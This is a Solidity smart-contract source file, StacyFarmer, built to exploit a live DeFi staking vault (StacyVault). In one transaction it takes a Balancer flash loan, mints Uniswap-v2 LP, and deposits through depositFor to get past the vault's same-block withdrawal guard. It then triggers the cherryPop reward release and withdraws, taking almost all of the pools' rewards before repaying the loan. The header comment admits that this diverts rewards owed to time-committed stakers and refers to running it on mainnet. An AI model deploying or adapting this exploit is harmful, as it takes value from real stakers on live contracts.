// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
    StacyFarmer — replicates the flash-loan "farm" that harvests StacyVault (a CORE / cVault fork).

    Mechanism (all in one transaction, no committed capital):
      1. Flash-borrow blue-chip tokens (Balancer V2, fee-free).
      2. For each target pool: add on-ratio liquidity to its Uniswap-v2 pair to mint a large LP amount,
         then StacyVault.depositFor(self, pid, L). depositFor never sets user.lastDepositBlock,
         so the "withdraw: same block as deposit" guard is bypassed for a fresh depositor.
         A large L makes us ~100% of that pool's staked supply.
      3. Call Stacy.cherryPop() (we hold the required CHADS/eMTRG). cherryPop moves ~1%/day (pro-rated by
         time since the last pop) of the STACY/WETH pair's STACY into the vault as pendingRewards, and pays
         the caller a 1% bounty.
      4. StacyVault.withdraw(self, pid, L). massUpdatePools() converts the fresh pendingRewards into
         accStacyPerShare over a supply we dominate, so updateAndPayOutPending pays us ~all of the pools'
         allocPoint share. Only (100 - PERCENT_LOCK_BONUS_REWARD)% is liquid; the rest is locked to us.
      5. Burn the LP back to the underlying tokens and repay the flash loan. Keep the STACY + the bounty.

    This uses only public functions of live contracts and the caller's own gas. It captures reward flow that
    would otherwise go to time-committed stakers of the dominated pools; it does not touch other users' deposits.
    Read the findings note for the (small) real economics before pointing this at mainnet.
*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IStacyVault {
    function poolInfo(uint256) external view returns (address token, uint256 allocPoint, uint256 accStacyPerShare, bool withdrawable);
    function depositFor(address depositForAddress, uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function stacy() external view returns (address);
}

interface IStacyToken {
    function cherryPop() external;
    function getCherryPopAmount() external view returns (uint256);
}

interface IUniV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function transfer(address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract StacyFarmer {
    IStacyVault public immutable VAULT;
    IStacyToken public immutable STACY;
    IBalancerVault public immutable BAL;
    address public owner;

    // transient run context
    uint256[] private _pids;
    address[] private _pairs;
    uint256[] private _lpTargets;
    address[] private _flashTokens; // sorted ascending
    uint256[] private _flashAmounts;
    bool private _inFlash;

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    constructor(address vault, address balancerVault) {
        VAULT = IStacyVault(vault);
        STACY = IStacyToken(IStacyVault(vault).stacy());
        BAL = IBalancerVault(balancerVault);
        owner = msg.sender;
    }

    /// @param pids           StacyVault pool ids to dominate (must be Uniswap-v2 LP pools, withdrawable).
    /// @param dominanceX     mint this multiple of each pool's currently-staked LP (bigger => larger capture share).
    /// @param lpFloor        minimum LP to mint per pool (for pools with ~zero existing stake).
    function farm(uint256[] calldata pids, uint256 dominanceX, uint256 lpFloor) external onlyOwner {
        delete _pids; delete _pairs; delete _lpTargets;
        // token -> aggregated amount, tracked in temp arrays
        address[] memory toks = new address[](pids.length * 2);
        uint256[] memory amts = new uint256[](pids.length * 2);
        uint256 tn;

        for (uint256 i = 0; i < pids.length; i++) {
            (address token,,, bool withdrawable) = VAULT.poolInfo(pids[i]);
            require(withdrawable, "pool !withdrawable");
            IUniV2Pair pair = IUniV2Pair(token);
            (uint112 r0, uint112 r1,) = pair.getReserves();
            uint256 ts = pair.totalSupply();
            uint256 staked = pair.balanceOf(address(VAULT));
            uint256 L = staked * dominanceX;
            if (L < lpFloor) L = lpFloor;
            // on-ratio amounts to mint L (round up a wei to guarantee >= L minted)
            uint256 a0 = (L * r0) / ts + 1;
            uint256 a1 = (L * r1) / ts + 1;
            _pids.push(pids[i]);
            _pairs.push(token);
            _lpTargets.push(L);
            tn = _accum(toks, amts, tn, pair.token0(), a0);
            tn = _accum(toks, amts, tn, pair.token1(), a1);
        }

        // sort unique tokens ascending (Balancer requirement)
        for (uint256 i = 0; i < tn; i++) {
            for (uint256 j = i + 1; j < tn; j++) {
                if (toks[j] < toks[i]) { (toks[i], toks[j]) = (toks[j], toks[i]); (amts[i], amts[j]) = (amts[j], amts[i]); }
            }
        }
        delete _flashTokens; delete _flashAmounts;
        address[] memory ft = new address[](tn);
        uint256[] memory fa = new uint256[](tn);
        for (uint256 i = 0; i < tn; i++) { ft[i] = toks[i]; fa[i] = amts[i]; _flashTokens.push(toks[i]); _flashAmounts.push(amts[i]); }

        _inFlash = true;
        BAL.flashLoan(address(this), ft, fa, "");
        _inFlash = false;
    }

    function _accum(address[] memory toks, uint256[] memory amts, uint256 tn, address t, uint256 a) private pure returns (uint256) {
        for (uint256 i = 0; i < tn; i++) { if (toks[i] == t) { amts[i] += a; return tn; } }
        toks[tn] = t; amts[tn] = a; return tn + 1;
    }

    // Balancer V2 flash-loan callback
    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory) external {
        require(msg.sender == address(BAL), "bad callback");
        require(_inFlash, "not in flash");

        uint256[] memory minted = new uint256[](_pids.length);
        // 1) mint LP into each pair and depositFor(self)
        for (uint256 i = 0; i < _pids.length; i++) {
            IUniV2Pair pair = IUniV2Pair(_pairs[i]);
            uint256 L = _lpTargets[i];
            (uint112 r0, uint112 r1,) = pair.getReserves();
            uint256 ts = pair.totalSupply();
            uint256 a0 = (L * r0) / ts + 1;
            uint256 a1 = (L * r1) / ts + 1;
            IERC20(pair.token0()).transfer(address(pair), a0);
            IERC20(pair.token1()).transfer(address(pair), a1);
            uint256 lp = pair.mint(address(this));
            minted[i] = lp;
            IERC20(_pairs[i]).approve(address(VAULT), lp);
            VAULT.depositFor(address(this), _pids[i], lp);
        }

        // 2) trigger the reward lump (needs CHADS/eMTRG held by this contract)
        STACY.cherryPop();

        // 3) withdraw -> pays out our pools' share; burn LP back to underlying
        for (uint256 i = 0; i < _pids.length; i++) {
            VAULT.withdraw(_pids[i], minted[i]);
            IUniV2Pair pair = IUniV2Pair(_pairs[i]);
            IERC20(_pairs[i]).transfer(_pairs[i], minted[i]);
            pair.burn(address(this));
        }

        // 4) repay flash loan (Balancer fee is 0)
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transfer(address(BAL), amounts[i] + feeAmounts[i]);
        }
    }

    function sweep(address token, address to) external onlyOwner {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }

    function setOwner(address o) external onlyOwner { owner = o; }
}
